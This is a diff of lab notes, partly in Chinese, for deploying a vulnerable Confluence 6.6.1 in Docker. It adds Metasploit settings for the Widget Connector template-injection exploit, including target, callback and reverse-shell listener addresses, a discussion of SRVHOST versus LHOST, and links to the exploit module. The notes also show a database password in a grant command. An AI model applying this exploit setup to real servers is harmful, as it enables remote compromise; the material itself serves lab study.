@@ -171,7 +171,7 @@ MySQL [mysql]> show variables like 'transaction_isolation';
 ```bash
 docker build -t confluence:6.6.1 .
 
-docker run -d --name confluence -p 18010:8090 -e TZ="Asia/Shanghai" -v /home/kali/lab/confluence/data:/var/atlassian/confluence confluence:6.6.1
+docker run -d --name confluence -p 18010:8090 -e TZ="Asia/Shanghai" -v /home/kali/lab/confluence/data:/var/atlassian/confluence confluence:6.6.1.1
 docker run -it --name confluence -p 18010:8090 -e TZ="Asia/Shanghai" -v /home/kali/lab/confluence/data:/var/atlassian/confluence confluence:6.6.1 bash
 /entrypoint.py
 docker run -d --name confluence \
@@ -228,3 +228,37 @@ grant all on confluence.* to 'confluence'@'%' identified by 'M4Zyq4eQbmgWfoyfNVn
 # confluence要求设置事务级别为READ-COMMITTED
 set global tx_isolation='READ-COMMITTED';
 ```
+
+RHOSTS      127.0.0.1                  yes       The target host(s), range CIDR identifier,
+                                                    or hosts file with syntax 'file:<path>'
+   RPORT       18010                      yes       The target port (TCP)
+   SRVHOST     10.0.2.15                  yes       Callback address for template loading
+   SRVPORT     4444                       yes       The local port to listen on.
+LHOST  192.168.56.111   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+set RHOSTS 127.0.0.0
+set RPORT 18010
+set SRVHOST 10.0.2.15
+set SRVPORT 4444
+
+SRVHOST 和 LHOST 的区别是什么？
+好像 SRVHOST 也是bind绑定的ip
+也是payload 里写的ip
+如果 LPORT 和 SRVPORT不一样，报bind错误
+
+还有问题： 如果反向shell机器是SLB或是内网，外网漂移ip，SRVHOST 设备就没有办法
+
+SRVHOST 通常是你在 web 服务器上发布攻击信息时设置的选项，如果你使用的攻击信息不会在 web 服务器上发布，那么 LHOST 就是你应该设置的选项。
+SRVHOST is generally the option that you set when you are serving a exploit on a web server and LHOST is the option you would set if you were using a exploit that is not going to be served on a web server.
+In Metasploit, LHOST, RHOST and SRVHOST are some of the most commonly used variable names. LHOST refers to the IP of your machine, which is usually used to create a reverse connection to your machine after the attack succeeds. RHOST refers to the IP address of the target host. And SRVHOST is where the module will connect to download additional payload elements.
+
+
+Atlassian Confluence Widget Connector Macro - Velocity Template Injection (Metasploit)
+https://www.exploit-db.com/exploits/46731
+
+Atlassian Confluence Widget Connector Macro - SSTI
+https://www.exploit-db.com/exploits/49465
+2021-01-22
+
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/confluence_widget_connector.md
+https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/confluence_widget_connector.rb
